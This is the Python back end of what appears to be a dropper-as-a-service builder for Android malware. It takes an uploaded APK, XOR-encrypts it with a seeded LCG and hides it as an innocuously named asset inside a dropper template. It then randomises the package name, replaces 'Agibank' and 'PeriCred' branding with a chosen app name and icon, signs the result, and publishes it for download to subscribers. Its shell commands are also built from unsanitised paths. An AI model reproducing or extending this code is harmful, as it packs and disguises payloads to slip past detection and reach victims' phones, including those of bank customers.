import os
import re
import secrets
import shutil
import string
import subprocess
import xml.etree.ElementTree as ET
import zipfile

from werkzeug.utils import secure_filename

from config import Config
from services.build_state import BUILD_STATUS
from services.data import add_build_history, add_history, update_amplification
from services.java_runtime import JAVA_BIN


def encrypt_lcg(data, seed):
    j = seed
    encrypted = bytearray()
    for byte in data:
        j = ((j * 1664525) + 1013904223) & 0xFFFFFFFF
        xor_val = (j >> 24) & 0xFF
        encrypted.append(byte ^ xor_val)
    return encrypted


def slugify_package_segment(name, max_len=20):
    segment = re.sub(r"[^a-z0-9]", "", name.lower())
    if not segment or not segment[0].isalpha():
        segment = "app" + segment
    return (segment[:max_len] or "app")


def generate_package_name(app_name):
    base = slugify_package_segment(app_name)
    suffix = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    return f"com.{base}.mobile.{suffix}"


def apply_package_rename(dropper_work, old_package, new_package):
    old_path = old_package.replace(".", "/")
    new_path = new_package.replace(".", "/")
    old_smali_dir = os.path.join(dropper_work, "smali", old_path)
    new_smali_dir = os.path.join(dropper_work, "smali", new_path)

    for root_dir, _, files in os.walk(dropper_work):
        for file in files:
            if not file.endswith((".smali", ".xml")):
                continue
            file_path = os.path.join(root_dir, file)
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as file_handle:
                    content = file_handle.read()
                new_content = content.replace(old_package, new_package).replace(old_path, new_path)
                if new_content != content:
                    with open(file_path, "w", encoding="utf-8") as file_handle:
                        file_handle.write(new_content)
            except OSError:
                pass

    if not os.path.isdir(old_smali_dir):
        return

    os.makedirs(os.path.dirname(new_smali_dir), exist_ok=True)
    if os.path.exists(new_smali_dir):
        shutil.rmtree(new_smali_dir)
    shutil.move(old_smali_dir, new_smali_dir)

    smali_root = os.path.join(dropper_work, "smali")
    check_dir = os.path.dirname(old_smali_dir)
    while check_dir.startswith(smali_root) and check_dir != smali_root:
        try:
            if os.listdir(check_dir):
                break
            os.rmdir(check_dir)
            check_dir = os.path.dirname(check_dir)
        except OSError:
            break


def _set_status(build_id, status, progress, error=False, portal="subscriber", owner=None, ephemeral=False):
    current = BUILD_STATUS.get(build_id, {})
    BUILD_STATUS[build_id] = {
        "status": status,
        "progress": progress,
        "error": error,
        "portal": portal or current.get("portal", "subscriber"),
        "owner": owner or current.get("owner"),
        "ephemeral": ephemeral if ephemeral else current.get("ephemeral", False),
        "output_file": current.get("output_file"),
    }


def process_apk(
    build_id,
    user_apk_path,
    custom_app_name,
    username,
    custom_icon_path=None,
    persist=True,
    portal="subscriber",
):
    BUILD_STATUS[build_id] = {
        "status": "Iniciando...",
        "progress": 0,
        "portal": portal,
        "owner": username,
        "ephemeral": not persist,
    }

    try:
        if not JAVA_BIN:
            raise RuntimeError("Java nao encontrado. Instale OpenJDK 17+ ou defina JAVA_HOME.")

        if persist:
            add_build_history(username, custom_app_name, "processando", build_id)
        _set_status(build_id, "Extraindo APK...", 15, portal=portal, owner=username, ephemeral=not persist)

        user_apk_extracted = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_extracted")
        if os.path.exists(user_apk_extracted):
            shutil.rmtree(user_apk_extracted)
        os.makedirs(user_apk_extracted, exist_ok=True)

        try:
            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
                zip_ref.extractall(user_apk_extracted)
        except Exception:
            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
                for member in zip_ref.namelist():
                    try:
                        zip_ref.extract(member, user_apk_extracted)
                    except Exception:
                        pass

        if not os.path.exists(os.path.join(user_apk_extracted, "AndroidManifest.xml")):
            _set_status(build_id, "Extraindo arquivos...", 20)
            subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" d "{user_apk_path}" -o "{user_apk_extracted}" -f',
                shell=True,
            )

        _set_status(build_id, "Preparando Dropper", 30)
        dropper_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_dropper")
        if os.path.exists(dropper_work):
            shutil.rmtree(dropper_work)
        shutil.copytree(Config.DROPPER_TEMPLATE, dropper_work)

        app_name = custom_app_name if custom_app_name else "App"
        new_package = generate_package_name(app_name)

        _set_status(build_id, "Configurando aplicativo...", 35)
        apply_package_rename(dropper_work, Config.OLD_PACKAGE, new_package)

        if custom_icon_path and os.path.exists(custom_icon_path):
            for density in [
                "res/mipmap-hdpi",
                "res/mipmap-mdpi",
                "res/mipmap-xhdpi",
                "res/mipmap-xxhdpi",
                "res/mipmap-xxxhdpi",
            ]:
                path = os.path.join(dropper_work, density)
                os.makedirs(path, exist_ok=True)
                for name in ["ic_launcher.png", "ic_launcher_round.png"]:
                    shutil.copy2(custom_icon_path, os.path.join(path, name))

        strings_xml = os.path.join(dropper_work, "res/values/strings.xml")
        if os.path.exists(strings_xml):
            try:
                tree = ET.parse(strings_xml)
                root = tree.getroot()
                for string_node in root.findall("string"):
                    if string_node.get("name") == "app_name":
                        string_node.text = app_name
                tree.write(strings_xml, encoding="utf-8", xml_declaration=True)
            except Exception:
                pass

        for root_dir, _, files in os.walk(dropper_work):
            for file in files:
                if file.endswith((".smali", ".xml")):
                    file_path = os.path.join(root_dir, file)
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as file_handle:
                            content = file_handle.read()
                        new_content = (
                            content.replace("PeriCred", app_name)
                            .replace("Agibank", app_name)
                            .replace("AgiBank", app_name)
                        )
                        if content != new_content:
                            with open(file_path, "w", encoding="utf-8") as file_handle:
                                file_handle.write(new_content)
                    except Exception:
                        pass

        _set_status(build_id, "Injetando Payload", 60)
        with open(user_apk_path, "rb") as file_handle:
            payload_data = file_handle.read()
        encrypted = b"\x00" * 16 + encrypt_lcg(payload_data, Config.SEED)
        payload_path = os.path.join(dropper_work, "assets/dbliqgnjl.dat")
        os.makedirs(os.path.dirname(payload_path), exist_ok=True)
        with open(payload_path, "wb") as file_handle:
            file_handle.write(encrypted)

        _set_status(build_id, "Compilando APK", 80)
        unsigned_apk = os.path.join(Config.OUTPUT_FOLDER, f"{build_id}_unsigned.apk")

        if not os.path.exists(Config.APKTOOL_JAR):
            raise RuntimeError("Ferramenta de compilacao nao encontrada.")

        res_b = subprocess.run(
            f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
            shell=True,
            capture_output=True,
            text=True,
        )
        if not os.path.exists(unsigned_apk):
            subprocess.run(f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" empty-framework-dir', shell=True)
            res_b = subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
                shell=True,
                capture_output=True,
                text=True,
            )
            if not os.path.exists(unsigned_apk):
                err = (res_b.stderr or res_b.stdout or "apktool falhou sem mensagem").strip()
                raise RuntimeError(f"Erro na compilacao: {err[:300]}")

        _set_status(build_id, "Assinando APK", 90)
        output_dir = os.path.join(Config.OUTPUT_FOLDER, build_id)
        os.makedirs(output_dir, exist_ok=True)

        if not os.path.exists(Config.SIGNER_JAR):
            raise RuntimeError("Ferramenta de assinatura nao encontrada.")

        res_s = subprocess.run(
            f'"{JAVA_BIN}" -jar "{Config.SIGNER_JAR}" --apks "{unsigned_apk}" --out "{output_dir}"',
            shell=True,
            capture_output=True,
            text=True,
        )

        final_apk = None
        if os.path.exists(output_dir):
            for filename in os.listdir(output_dir):
                if filename.endswith(".apk"):
                    final_apk = os.path.join(output_dir, filename)
                    break

        if not final_apk:
            raise RuntimeError(f"Erro na assinatura: {res_s.stderr}")

        final_name = f"{secure_filename(app_name)}.apk"
        shutil.move(final_apk, os.path.join(Config.OUTPUT_FOLDER, final_name))
        BUILD_STATUS[build_id] = {
            "status": "Concluido",
            "progress": 100,
            "output_file": final_name,
            "portal": portal,
            "owner": username,
            "ephemeral": not persist,
        }
        if persist:
            add_build_history(username, custom_app_name, "concluido", build_id, final_name)
            update_amplification(username, "concluido")
            add_history(username, "Build APK", f"App: {app_name}", portal="subscriber")
            from services.public_app_service import register_public_download

            register_public_download(
                build_id=build_id,
                app_name=app_name,
                output_file=final_name,
                icon_path=custom_icon_path,
            )

    except Exception as exc:
        print(f"ERRO NO BUILD {build_id}: {exc}")
        _set_status(
            build_id,
            "Erro no processamento. Tente novamente.",
            0,
            error=True,
            portal=portal,
            owner=username,
            ephemeral=not persist,
        )
        if persist:
            add_build_history(username, custom_app_name, "erro", build_id)
            update_amplification(username, "erro")
